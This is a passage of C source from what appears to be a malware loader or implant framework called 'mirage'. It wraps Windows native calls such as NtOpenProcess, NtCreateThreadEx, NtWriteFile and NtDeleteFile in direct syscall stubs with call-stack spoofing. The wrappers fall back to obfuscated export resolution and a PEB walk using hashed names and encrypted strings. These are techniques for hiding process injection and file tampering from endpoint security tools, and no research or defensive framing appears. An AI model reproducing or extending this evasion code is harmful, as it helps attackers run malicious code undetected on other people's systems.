    }
    static pNtOpenFile fn = NULL;
    if (!fn) fn = (pNtOpenFile)resolve_export_obf(_NtOpenFile_obf, sizeof(_NtOpenFile_obf));
    return fn ? fn(a,b,c,d,e,f) : -1;
}

NTSTATUS mirage_NtWriteFile(HANDLE a, HANDLE b, PVOID c, PVOID d, PVOID e, PVOID f, ULONG g, PVOID h, PVOID i) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtWriteFile_stub,
                (uint64_t)a, (uint64_t)b, (uint64_t)c, (uint64_t)d, (uint64_t)e, (uint64_t)f, g, (uint64_t)h, (uint64_t)i, 0, 0);
        }
        return (NTSTATUS)NtWriteFile_stub((uint64_t)a,(uint64_t)b,(uint64_t)c,(uint64_t)d,(uint64_t)e,(uint64_t)f,g,(uint64_t)h,(uint64_t)i);
    }
    static pNtWriteFile fn = NULL;
    if (!fn) fn = (pNtWriteFile)resolve_export_obf(_NtWriteFile_obf, sizeof(_NtWriteFile_obf));
    return fn ? fn(a,b,c,d,e,f,g,h,i) : -1;
}

NTSTATUS mirage_NtSetInformationProcess(HANDLE a, ULONG b, PVOID c, ULONG d) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtSetInformationProcess_stub,
                (uint64_t)a, b, (uint64_t)c, d, 0, 0, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtSetInformationProcess_stub((uint64_t)a,b,(uint64_t)c,d);
    }
    static pNtSetInformationProcess fn = NULL;
    if (!fn) fn = (pNtSetInformationProcess)resolve_export_obf(_NtSetInformationProcess_obf, sizeof(_NtSetInformationProcess_obf));
    return fn ? fn(a,b,c,d) : -1;
}

NTSTATUS mirage_NtOpenKey(HANDLE* a, ULONG b, PVOID c) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtOpenKey_stub,
                (uint64_t)a, b, (uint64_t)c, 0, 0, 0, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtOpenKey_stub((uint64_t)a,b,(uint64_t)c);
    }
    static pNtOpenKey fn = NULL;
    if (!fn) fn = (pNtOpenKey)resolve_export_obf(_NtOpenKey_obf, sizeof(_NtOpenKey_obf));
    return fn ? fn(a,b,c) : -1;
}

NTSTATUS mirage_NtQueryValueKey(HANDLE a, PVOID b, ULONG c, PVOID d, ULONG e, ULONG* f) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtQueryValueKey_stub,
                (uint64_t)a, (uint64_t)b, c, (uint64_t)d, e, (uint64_t)f, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtQueryValueKey_stub((uint64_t)a,(uint64_t)b,c,(uint64_t)d,e,(uint64_t)f);
    }
    static pNtQueryValueKey fn = NULL;
    if (!fn) fn = (pNtQueryValueKey)resolve_export_obf(_NtQueryValueKey_obf, sizeof(_NtQueryValueKey_obf));
    return fn ? fn(a,b,c,d,e,f) : -1;
}

NTSTATUS mirage_NtOpenProcess(HANDLE* a, ULONG b, PVOID c, PVOID d) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtOpenProcess_stub,
                (uint64_t)a, b, (uint64_t)c, (uint64_t)d, 0, 0, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtOpenProcess_stub((uint64_t)a,b,(uint64_t)c,(uint64_t)d);
    }
    static pNtOpenProcess fn = NULL;
    if (!fn) fn = (pNtOpenProcess)resolve_export_obf(_NtOpenProcess_obf, sizeof(_NtOpenProcess_obf));
    return fn ? fn(a,b,c,d) : -1;
}

NTSTATUS mirage_NtCreateThreadEx(HANDLE* a, ULONG b, PVOID c, HANDLE d, PVOID e, PVOID f, ULONG g, SIZE_T h, SIZE_T i, SIZE_T j, PVOID k) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtCreateThreadEx_stub,
                (uint64_t)a, b, (uint64_t)c, (uint64_t)d, (uint64_t)e, (uint64_t)f, g, h, i, j, (uint64_t)k);
        }
        return (NTSTATUS)NtCreateThreadEx_stub((uint64_t)a,b,(uint64_t)c,(uint64_t)d,(uint64_t)e,(uint64_t)f,g,h,i,j,(uint64_t)k);
    }
    static pNtCreateThreadEx fn = NULL;
    if (!fn) fn = (pNtCreateThreadEx)resolve_export_obf(_NtCreateThreadEx_obf, sizeof(_NtCreateThreadEx_obf));
    return fn ? fn(a,b,c,d,e,f,g,h,i,j,k) : -1;
}

NTSTATUS mirage_NtFlushInstructionCache(HANDLE a, PVOID b, SIZE_T c) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtFlushInstructionCache_stub,
                (uint64_t)a, (uint64_t)b, c, 0, 0, 0, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtFlushInstructionCache_stub((uint64_t)a,(uint64_t)b,c);
    }
    static pNtFlushInstructionCache fn = NULL;
    if (!fn) fn = (pNtFlushInstructionCache)resolve_export_obf(_NtFlushInstructionCache_obf, sizeof(_NtFlushInstructionCache_obf));
    return fn ? fn(a,b,c) : -1;
}

NTSTATUS mirage_NtCreateEvent(HANDLE* a, ULONG b, PVOID c, ULONG d, ULONG e) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtCreateEvent_stub,
                (uint64_t)a, b, (uint64_t)c, d, e, 0, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtCreateEvent_stub((uint64_t)a,b,(uint64_t)c,d,e);
    }
    static pNtCreateEvent fn = NULL;
    if (!fn) fn = (pNtCreateEvent)resolve_export_obf(_NtCreateEvent_obf, sizeof(_NtCreateEvent_obf));
    return fn ? fn(a,b,c,d,e) : -1;
}

NTSTATUS mirage_NtDeleteFile(PVOID a) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtDeleteFile_stub,
                (uint64_t)a, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtDeleteFile_stub((uint64_t)a);
    }
    static pNtDeleteFile fn = NULL;
    if (!fn) fn = (pNtDeleteFile)resolve_export_obf(_NtDeleteFile_obf, sizeof(_NtDeleteFile_obf));
    return fn ? fn(a) : -1;
}

NTSTATUS mirage_NtSetInformationFile(HANDLE a, PVOID b, PVOID c, ULONG d, ULONG e) {
    if (!g_use_fallback) {
        if (g_spoof_ready) {
            return (NTSTATUS)spoof_call(&g_spoof_cfg, (void*)NtSetInformationFile_stub,
                (uint64_t)a, (uint64_t)b, (uint64_t)c, d, e, 0, 0, 0, 0, 0, 0);
        }
        return (NTSTATUS)NtSetInformationFile_stub((uint64_t)a,(uint64_t)b,(uint64_t)c,d,e);
    }
    static pNtSetInformationFile fn = NULL;
    if (!fn) fn = (pNtSetInformationFile)resolve_export_obf(_NtSetInformationFile_obf, sizeof(_NtSetInformationFile_obf));
    return fn ? fn(a,b,c,d,e) : -1;
}

LONG mirage_NtUserGetSystemMetrics(ULONG nIndex) {
    if (!g_use_fallback) {
        return (LONG)(uint32_t)NtUserGetSystemMetrics_stub(nIndex);
    }
    /* Fallback: resolve GetSystemMetrics via PEB-walk */
    typedef int (WINAPI *pGetSystemMetrics)(int);
    static pGetSystemMetrics pGSM = NULL;
    if (!pGSM) {
        char dll[32];
        deobf_str(enc_user32, ENC_USER32_LEN, dll);
        void *u32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
        if (u32) {
            char fn[32];
            deobf_str(enc_GetSystemMetrics, ENC_GETSYSTEMMETRICS_LEN, fn);
            pGSM = (pGetSystemMetrics)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
        }
    }
    return pGSM ? (LONG)(uint32_t)pGSM(nIndex) : 0;
}
